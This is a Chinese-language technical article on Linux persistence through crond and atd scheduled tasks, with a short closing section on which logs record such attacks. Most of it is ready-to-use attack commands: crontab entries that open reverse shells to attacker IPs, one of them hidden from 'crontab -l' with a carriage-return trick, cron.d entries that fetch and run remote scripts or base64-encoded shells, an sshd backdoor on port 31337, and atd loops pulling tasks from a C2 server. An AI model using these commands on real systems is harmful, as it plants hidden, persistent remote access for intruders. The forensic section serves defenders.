计划任务是一类帮助计算机在满足某些时间条件下执行命令的服务。最常见的是crond，此外还有anacron，atd等多种服务。使用这些计划任务进行持久化控制时一定要确认服务有没有开启。不少服务默认RHEL系下是打开的，但是Debian系下是关闭状态。



## 计划任务持久化

计划任务持久化常被用于进行定时反弹shell及挖矿矿工的生命周期管理。虽然计划任务持久化在实际场景下用的非常多，甚至很多人都觉得这块的攻击手法很固定，但是实际上还是可以再深究探讨的。

### crond

```shell
crontab -l | { cat; echo "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/2333 0>&1"; } | crontab -
#使用crontab -l 或cat时有隐藏效果
(crontab -l;printf "*/1 * * * * bash -i >& /dev/tcp/192.168.44.128/5555 0>&1;\rno crontab for `whoami`%100c\n")|crontab -
```

上面是最常见的两个计划任务反弹shell命令，命令广为人知，且使用效果好。但是计划任务能反弹shell如果停留在这个层面那就太水了。

crontab命令实际的作用文件是：

```shell
#RHEL:
/var/spool/cron/`whoami`

#Debian:
/var/spool/cron/crontabs/`whoami`
```



而crond服务进行反弹shell的话除了上面的目录以外还能部署到/etc/crontab及/etc/cron.*/

```shell
echo ' * */5 * * * root ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337' >> /etc/crontab
```

部署到/etc/cron.*/目录下的文件是一种更为隐蔽的方案。下面给出一些具体实例

```shell
echo '*/1 * * * * root curl http://1.1.1.1:8083/a|sh' >> /etc/cron.d/man-db
echo '*/1 * * * * root echo L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvMTkyLjE2OC4xMy41OC8xMDA5MSAwPCYxIDI+JjEK|base64 -d|sh' >> /etc/cron.d/0hourly
echo '*/1 * * * * root echo L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvMTkyLjE2OC4xMy41OC8xMDA5MSAwPCYxIDI+JjEK|base64 -d|sh' >> /etc/cron.d/man-db
```

### atd

使用atd也能模拟出定时任务的效果，只要让它执行完需要执行的命令后在加入新的at任务到atd服务中即可。下面给出两个例子：

**例子1**：本地用shell脚本实现atd版的周期定时反弹shell

```shell
echo "at now+1min <<EOF" >> /tmp/...
echo "bash /tmp/..." >> /tmp/...
echo "EOF" >> /tmp/...
echo "bash -i >& /dev/tcp/192.168.44.123/10092 0>&1;" >> /tmp/...


at now+1min <<EOF
bash /tmp/...
EOF
```

**例子2**：远程请求受害方无法有效追溯的C2服务器获得任务执行

```shell
#c2server
echo "at now+1min <<EOF" >> /tmp/...
echo "curl http://192.168.44.123:10091/a | sh" >> /tmp/...
echo "EOF" >> /tmp/...
echo "bash -i >& /dev/tcp/192.168.44.123/10092 0>&1;" >> /tmp/...
python3 -m http.server 10091

#victim
at now+1min <<EOF
curl http://192.168.44.123:10091/a | sh
EOF
```

## 攻击手法分析与溯源

由于anacron、logrotate都是基于crond来做的，因此，这里主要针对crond及atd服务的攻击手法进行分析。

### crond

使用crond构建定时任务的攻击手法中，crond的相关记录会被记录在/var/log/中的以下日志中，日志中是无法看到具体执行的命令内容的，但是能看到执行定时任务的具体文件，这一定程度上能帮助运维人员加快对攻击的定位。

```shell
audit/audit.log
messages
cron
```



### atd

使用atd构建定时任务的攻击手法中，atd的相关记录会被记录在/var/log/中的以下日志中，除了能从中发现大量的周期性的atd执行以外，无一例外的无法看到具体执行的命令内容。

```shell
./audit/audit.log
./secure
./cron
./messages
```

/var/spool/at 或/var/spool/cron/at*中能看到当前atq队列中待执行的任务的具体内容，这是细粒度的，但是随着时间的推移，如果攻击者放置的持久化文件或C2服务器已消失，那么将无法看到具体执行的内容。

